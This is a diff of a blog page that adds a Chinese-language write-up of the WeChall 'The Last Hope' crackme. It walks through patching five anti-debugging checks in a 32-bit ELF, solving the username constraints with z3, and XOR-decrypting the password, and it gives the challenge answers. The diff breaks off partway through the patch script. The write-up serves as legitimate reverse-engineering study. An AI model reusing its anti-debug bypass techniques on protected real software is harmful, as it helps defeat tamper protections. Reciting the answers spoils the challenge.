@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">373</span>
+          <span class="site-state-item-count">375</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -245,7 +245,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">231</span>
+        <span class="site-state-item-count">232</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -375,6 +375,348 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-the-last-hope/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-the-last-hope/" class="post-title-link" itemprop="url">WeChall - The Last Hope</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-14 16:04:50 / Modified: 16:04:51" itemprop="dateCreated datePublished" datetime="2026-07-14T16:04:50+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-the-last-hope/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-the-last-hope/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>WeChall 上的 <span class="exturl" data-url="aHR0cHM6Ly93d3cud2VjaGFsbC5uZXQvY2hhbGxlbmdlL2JzZGhlbGwvdGhlbGFzdGhvcGUvaW5kZXgucGhw">The
+Last Hope<i class="fa fa-external-link-alt"></i></span>（Linux, Cracking），由一个 32-bit ELF 二进制构成。</p>
+<h3 id="反调试绕过">反调试绕过</h3>
+<p>二进制有 5 层反调试，必须全部 patch 掉才能正常运行或调试。</p>
+<p>先用 <code>rabin2</code> 获取基本信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rabin2 -I bsd_thelasthope.elf</span><br><span class="line">arch     x86</span><br><span class="line">binsz    10569</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">compiler GCC: (Ubuntu 4.3.3-5ubuntu4) 4.3.3</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pic      false</span><br><span class="line">relocs   false</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br></pre></td></tr></table></figure>
+<h4 id="layer-1-.ctors-构造函数">Layer 1: <code>.ctors</code>
+构造函数</h4>
+<p>在 <code>main()</code> 之前，<code>.ctors</code> 段中的
+<code>anti_ptrace</code> 就会被调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;pf. S .ctors&#x27; bsd_thelasthope.elf</span><br><span class="line">0x0804af00 ffffffff 5b8c0408 00000000     ....[.......</span><br></pre></td></tr></table></figure>
+<p><code>0x08048c5b</code> 即 <code>anti_ptrace</code>。将其 patch 为
+<code>0xffffffff</code>（sentinel 值），让反向遍历提前终止：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># .ctors entry @ VA 0x0804af04 → 文件偏移 = VA - 0x08049000 = 0x1f04</span><br><span class="line">printf &#x27;\xff\xff\xff\xff&#x27; | dd of=bsd_thelasthope.elf bs=1 seek=$((0x1f04)) conv=notrunc</span><br></pre></td></tr></table></figure>
+<h4 id="layer-2-3-main-中的-anti_ptrace-调用-sigtrap-handler">Layer 2
+&amp; 3: main 中的 anti_ptrace 调用 + SIGTRAP handler</h4>
+<p>用 r2 查看 <code>main</code> 的 disassembly：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ main&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p>关键片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048d59: call anti_ptrace</span><br><span class="line">0x08048d5e: mov  dword [esp+4], handler  ; signal handler</span><br><span class="line">0x08048d66: mov  dword [esp], 5           ; SIGTRAP</span><br><span class="line">0x08048d6d: call signal</span><br></pre></td></tr></table></figure>
+<p>Patch 这两处为 NOP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># VA 0x08048d59 → 文件偏移 0x0d59: 5 bytes → NOP</span><br><span class="line"># VA 0x08048d6d → 文件偏移 0x0d6d: 5 bytes → NOP</span><br></pre></td></tr></table></figure>
+<h4 id="layer-4-int3-breakpoint-检测">Layer 4: INT3 + breakpoint
+检测</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x08048d72: int3                    ; SIGTRAP → handler 吞掉</span><br><span class="line">0x08048d73: mov  eax, 0x8048bd1     ; pw_check 地址</span><br><span class="line">0x08048d78: add  eax, 3</span><br><span class="line">0x08048d7b: mov  eax, [eax]</span><br><span class="line">0x08048d7d: and  eax, 0xff</span><br><span class="line">0x08048d82: cmp  eax, 0xcc          ; 检查 pw_check+3 是否被设了 0xCC (int3)</span><br><span class="line">0x08048d87: jne  ...</span><br><span class="line">; 如果发现 0xCC → 打印 &quot;no,no breakpoints&quot; → exit</span><br></pre></td></tr></table></figure>
+<p>Patch 方案：把 <code>int3</code> (VA 0x08048d72 → 文件偏移 0x0d72)
+NOP 掉，把 <code>jne</code> (VA 0x08048d87 → 0x0d87) 改为
+<code>jmp</code>。</p>
+<h4 id="layer-5-ptraceptrace_traceme">Layer 5:
+ptrace(PTRACE_TRACEME)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048dc0: call ptrace             ; ptrace(PTRACE_TRACEME, 0, 1, 0)</span><br><span class="line">0x08048dc5: test eax, eax</span><br><span class="line">0x08048dc7: jns  ...                ; ≥0 → 正常; &lt;0 → &quot;oh oh DEBUGGING... Bye&quot;</span><br></pre></td></tr></table></figure>
+<p>由于 Layer 1 的 fork 子进程已经 ptrace(ATTACH)
+了父进程，PTRACE_TRACEME 必然失败（一个进程只能被一个 tracer
+追踪）。改为 <code>xor eax, eax</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># VA 0x08048dc0 → 文件偏移 0x0dc0: 5 bytes → xor eax,eax; nop; nop; nop (31 c0 90 90 90)</span><br></pre></td></tr></table></figure>
+<p>完整 patch 脚本见文末。</p>
+<h3 id="username-逆向-user_check">Username 逆向
+(<code>user_check</code>)</h3>
+<h4 id="函数调用链">函数调用链</h4>
+<p>用 r2 列出关键函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;afl~check&#x27; bsd_thelasthope.elf</span><br><span class="line">0x08048863  user_check</span><br><span class="line">0x08048bd1  pw_check</span><br><span class="line">0x080487a6  length_check</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中的处理流程：</p>
+<ol type="1">
+<li><code>fgets(username, 15, stdin)</code> — 读入包含换行符（如
+<code>"whoami\n"</code>，<code>strlen=7</code>）</li>
+<li><code>lc(username, len)</code> — 检查前 <code>len-1</code>
+个字符不含大写字母</li>
+<li><code>uc(username, len)</code> — 将前 <code>len-1</code>
+个字符转为大写（原地修改，内部调用 <code>toupper()</code>）</li>
+<li><code>user_check(username, len)</code> — 逐字符验证</li>
+</ol>
+<p>由于 <code>fgets</code>
+保留换行符，<code>strlen("whoami\n")=7</code>，循环 <code>i=0..5</code>
+覆盖全部 6 个有效字符。换行符在 <code>i=6</code> 处被排除。</p>
+<h4 id="约束条件应用于大写-ascii-值">约束条件（应用于大写 ASCII
+值）</h4>
+<p>用 <code>pwntools</code> 快速提取符号和关键常量：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;user_check @ <span class="subst">&#123;elf.symbols[<span class="string">&#x27;user_check&#x27;</span>]:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密目标字符串（位于 .rodata 0x08049050）</span></span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;encrypted target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># b&#x27;Oxw|n]nfog&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>user_check</code> 对每个位置 <code>i</code>
+执行不同的检查，将满足条件的值累加到 accumulator，最终与
+<code>0xcd5</code> (3285) 比较：</p>
+<ul>
+<li><strong>0, 1, 4</strong>: 6c±1 双 Fermat + 硬编码，累加
++13c。f0=6c-1, f1=6c+1 均须为基-2 伪素数</li>
+<li><strong>2, 5</strong>: 单 Fermat (c 自身)，累加 +c。2^(c-1) mod c ==
+1</li>
+<li><strong>3</strong>: 整除性，累加 +c。c % 5 == 0</li>
+</ul>
+<p>硬编码检查（在 fermat 通过后执行）：</p>
+<ul>
+<li><code>U[0]</code>: 2×c == 0xae (174) → c = 87 = <code>W</code></li>
+<li><code>U[1]</code>: 2×c == 0x90 (144) → c = 72 = <code>H</code></li>
+<li><code>U[4]</code>: 2×c == 0x9a (154) → c = 77 = <code>M</code></li>
+</ul>
+<p>U[0], U[1], U[4] 被固定为 <code>W</code>, <code>H</code>,
+<code>M</code>。同时要求 6c±1 为素数对（twin primes 模式）：</p>
+<ul>
+<li>W=87: 6×87-1=521(✓), 6×87+1=523(✓)</li>
+<li>H=72: 6×72-1=431(✓), 6×72+1=433(✓)</li>
+<li>M=77: 6×77-1=461(✓), 6×77+1=463(✓)</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：positions 0,1,4 的 fermat
+检查后有一条看似多余的 <code>c == floor(6c/5)</code> 比较，实际上编译器
+magic constant <code>0x2aaaaaab</code> 做的是除以 6（而非除以
+5）。<code>floor(6c/6) == c</code> 恒成立，实为 no-op。</p>
+</blockquote>
+<h4 id="求解">求解</h4>
+<p>已知 13×(87+72+77) = 3068，剩余：3285 - 3068 = 217。</p>
+<p>在 A-Z (65-90) 范围内筛选：</p>
+<ul>
+<li>U[2], U[5] 须为 Fermat 伪素数: <code>C, G, I, O, S, Y</code></li>
+<li>U[3] 须被 5 整除: <code>A, F, K, P, U, Z</code></li>
+</ul>
+<p>求 U[2] + U[3] + U[5] = 217 的解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U[2]=G(71), U[3]=K(75), U[5]=G(71) → WHGKMG (whgkmg)</span><br><span class="line">U[2]=I(73), U[3]=A(65), U[5]=O(79) → WHIAMO (whiamo)</span><br><span class="line">U[2]=O(79), U[3]=A(65), U[5]=I(73) → WHOAMI (whoami)</span><br></pre></td></tr></table></figure>
+<p>唯一形成有意义单词的是 <code>WHOAMI</code>，对应输入
+<code>whoami</code>（程序通过 <code>uc()</code> 自动转大写）。</p>
+<h4 id="z3-求解替代方案">z3 求解（替代方案）</h4>
+<p>此题约束本质是 CSP：6 个变量、有限域（A-Z）、线性方程 + 素性谓词。z3
+的 table-driven 模式很适合——预计算 26 个字符中哪些满足各位置约束，交给
+z3 解线性部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fermat_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">2</span>, n-<span class="number">1</span>, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预计算：26 个字符中哪些满足各位置的素性约束</span></span><br><span class="line">valid_014 = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)</span><br><span class="line">             <span class="keyword">if</span> is_fermat_prime(<span class="number">6</span>*c-<span class="number">1</span>) <span class="keyword">and</span> is_fermat_prime(<span class="number">6</span>*c+<span class="number">1</span>)]</span><br><span class="line">valid_25  = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> is_fermat_prime(c)]</span><br><span class="line">valid_3   = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> c % <span class="number">5</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bool table：每个字符是否满足对应约束</span></span><br><span class="line">table_014 = &#123;c: Bool(<span class="string">f&quot;twin_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_25  = &#123;c: Bool(<span class="string">f&quot;prime_<span class="subst">&#123;c&#125;</span>&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_3   = &#123;c: Bool(<span class="string">f&quot;mod5_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    s.add(table_014[c] == (c <span class="keyword">in</span> valid_014))</span><br><span class="line">    s.add(table_25[c]  == (c <span class="keyword">in</span> valid_25))</span><br><span class="line">    s.add(table_3[c]   == (c % <span class="number">5</span> == <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">U = [BitVec(<span class="string">f&#x27;U<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    s.add(U[i] &gt;= <span class="number">65</span>, U[i] &lt;= <span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Per-position constraints via table lookup</span></span><br><span class="line">s.add(Or([And(U[<span class="number">0</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">1</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">4</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">2</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">5</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">3</span>] == c, table_3[c])   <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hardcoded checks (from assembly)</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">0</span>] == <span class="number">174</span>)  <span class="comment"># 0xae → W</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">1</span>] == <span class="number">144</span>)  <span class="comment"># 0x90 → H</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">4</span>] == <span class="number">154</span>)  <span class="comment"># 0x9a → M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accumulator sum</span></span><br><span class="line">s.add(<span class="number">13</span> * (U[<span class="number">0</span>] + U[<span class="number">1</span>] + U[<span class="number">4</span>]) + U[<span class="number">2</span>] + U[<span class="number">3</span>] + U[<span class="number">5</span>] == <span class="number">3285</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[U[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> → <span class="subst">&#123;name.lower()&#125;</span>&quot;</span>)</span><br><span class="line">    s.add(Or([U[i] != m[U[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line"><span class="comment">#   WHGKMG → whgkmg</span></span><br><span class="line"><span class="comment">#   WHOAMI → whoami</span></span><br><span class="line"><span class="comment">#   WHIAMO → whiamo</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>为什么不用 angr？</strong> 此题有 x87
+浮点指令（<code>fprem</code>/<code>fmod</code> 做 Fermat 检验）+
+<code>fork/ptrace</code> 反调试 + <code>INT3</code> 断点检测。angr 的
+VEX IR 对 x87 浮点栈支持弱，<code>fork</code> 会直接 concretize，且
+patch 5 层反调试后 angr 能做的也只是验证已知路径——不如直接 z3
+解约束。</p>
+</blockquote>
+<h3 id="password-逆向-pw_check">Password 逆向
+(<code>pw_check</code>)</h3>
+<h4 id="xor-加密">XOR 加密</h4>
+<p>用 r2 反编译 <code>encrypt</code> 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ sym.encrypt&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中定义了 15 字节 XOR key（位于
+<code>[ebp-0x44]</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0x1f, 0x0a, 0x1e, 0x11, 0x0b, 0x09, 0x19, 0x0f, 0x01, 0x14,</span><br><span class="line"> 0x16, 0x0c, 0x06, 0x0d, 0x65]</span><br></pre></td></tr></table></figure>
+<p><code>encrypt()</code> 函数对密码逐字节 XOR：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    password[i] ^= key[i % <span class="number">15</span>];</span><br></pre></td></tr></table></figure>
+<p>然后 <code>chomp()</code> 去掉末尾换行符，<code>pw_check()</code>
+将结果与硬编码字符串比较。</p>
+<p>用 pwntools 直接读取目标字符串：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># Oxw|n]nfog</span></span><br></pre></td></tr></table></figure>
+<p>或直接用 r2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;ps @ 0x08049050&#x27; bsd_thelasthope.elf</span><br><span class="line">Oxw|n]nfog</span><br></pre></td></tr></table></figure>
+<h4 id="求解-1">求解</h4>
+<p>直接逆向 XOR，key 和密文等长（均为 10 字节）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="string">b&quot;Oxw|n]nfog&quot;</span></span><br><span class="line">key = [<span class="number">0x1f</span>, <span class="number">0x0a</span>, <span class="number">0x1e</span>, <span class="number">0x11</span>, <span class="number">0x0b</span>, <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x0f</span>, <span class="number">0x01</span>, <span class="number">0x14</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(e ^ key[i]) <span class="keyword">for</span> i, e <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted))</span><br><span class="line"><span class="comment"># → &quot;PrimeTwins&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="验证">验证</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O=0x4f ^ 0x1f = 0x50 = P</span><br><span class="line">x=0x78 ^ 0x0a = 0x72 = r</span><br><span class="line">w=0x77 ^ 0x1e = 0x69 = i</span><br><span class="line">|=0x7c ^ 0x11 = 0x6d = m</span><br><span class="line">n=0x6e ^ 0x0b = 0x65 = e</span><br><span class="line">]=0x5d ^ 0x09 = 0x54 = T</span><br><span class="line">n=0x6e ^ 0x19 = 0x77 = w</span><br><span class="line">f=0x66 ^ 0x0f = 0x69 = i</span><br><span class="line">o=0x6f ^ 0x01 = 0x6e = n</span><br><span class="line">g=0x67 ^ 0x14 = 0x73 = s</span><br></pre></td></tr></table></figure>
+<h3 id="完整-patch-脚本">完整 Patch 脚本</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Patch anti-debug measures in bsd_thelasthope.elf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ELF segment layout:</span></span><br><span class="line"><span class="string">  text: file 0x000000 → VA 0x08048000   (file_off = VA - 0x08048000)</span></span><br><span class="line"><span class="string">  data: file 0x001f00 → VA 0x0804af00   (file_off = VA - 0x08049000)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r+b&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Layer 1: .ctors → nuke anti_ptrace entry (VA 0x0804af04, data seg)</span></span><br><span class="line">        f.seek(<span class="number">0x1f04</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 2: NOP call anti_ptrace @ VA 0x08048d59 (5 bytes, text seg)</span></span><br><span class="line">        f.seek(<span class="number">0x0d59</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 3: NOP call signal @ VA 0x08048d6d (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0d6d</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 4a: NOP int3 @ VA 0x08048d72 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d72</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 4b: bypass 0xCC check — 